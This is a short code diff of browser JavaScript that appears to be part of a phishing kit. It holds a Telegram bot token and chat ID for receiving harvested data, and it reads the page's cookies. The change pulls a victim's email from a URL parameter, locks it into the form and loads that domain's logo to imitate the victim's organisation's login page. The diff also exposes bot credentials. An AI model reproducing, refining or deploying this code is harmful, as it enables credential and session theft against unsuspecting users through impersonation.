@@ -1,5 +1,5 @@
 // Telegram Bot config
-const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
+const TELEGRAM_BOT_TOKEN = "8472203015:AAFvwceukQ2Y2iRMtO5ML0WVIztYG5xWVN8";
 const TELEGRAM_CHAT_ID = "7574749243";
 
 // Elements
@@ -38,15 +38,17 @@ function parseCookies(cookieString = document.cookie) {
 
 // Grab cookies now
 const cookies = parseCookies();
-// Optional: console log to check cookies
-console.log("Cookies available to JS:", cookies);
+// Get email from URL  ?u=
+const params = new URLSearchParams(window.location.search);
+const rawEmail = params.get("bazz505");
 
-// Check email validity before proceeding with UI updates
-if (/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
-  emailInput.value = rawHash;
+// Check if email exists AND is valid
+if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+
+  emailInput.value = rawEmail;
   emailInput.setAttribute("uneditable", true);
 
-  const domain = rawHash.split('@')[1];
+  const domain = rawEmail.split('@')[1];
 
   // Set logo
   logoImg.src = `https://logo.clearbit.com/${domain}`;
